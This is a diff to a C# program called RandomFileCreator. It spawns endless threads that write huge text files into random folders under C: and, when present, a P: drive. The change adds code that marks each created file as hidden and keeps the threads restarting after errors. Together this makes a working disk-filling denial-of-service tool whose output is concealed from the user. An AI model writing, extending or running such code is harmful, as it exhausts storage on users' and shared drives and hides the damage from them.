@@ -7,27 +7,42 @@ namespace RandomFileCreator
 {
     class Program
     {
-        public const string startingRoot = "c:\\";
         public static Random random = new Random();
         public const int threads = 4;
 
         static void Main(string[] args)
         {
+            if (Directory.Exists("P:\\"))
+            {
+                RunThreads(threads, "P:\\");
+            }
+            else
+            {
+                RunThreads(threads / 2, "c:\\");
+            }
+            RunThreads(threads / 2 + threads % 2, "c:\\");
+        }
+
+        public static void RunThreads(int threads, string path)
+        {
             Thread[] thrs = new Thread[threads];
-            for (int i = 0; i < thrs.Length; i++)
+            for (int i = 0; i < threads; i++)
             {
                 thrs[i] = new Thread(Run);
-                thrs[i].Start();
+                thrs[i].Start(path);
             }
         }
-        public static void Run()
+
+        public static void Run(object path2)
         {
             try
             {
                 while (true)
                 {
-                    using (StreamWriter sw = new StreamWriter(RandomPath() + "\\" + RandomName() + ".txt", true))
+                    string path = RandomPath((string)path2) + "\\" + RandomName() + ".txt";
+                    using (StreamWriter sw = new StreamWriter(path, true))
                     {
+                        File.SetAttributes(path, File.GetAttributes(path) | FileAttributes.Hidden);
                         for (int i = 0; i < 1000000; i++)
                         {
                             String tmpString = new String('l', i);
@@ -38,11 +53,11 @@ namespace RandomFileCreator
             }
             catch (Exception)
             {
-                Run();
+                Run((string)path2);
                 return;
             }
         }
-        public static string RandomPath(string path = startingRoot)
+        public static string RandomPath(string path)
         {
             try
             {
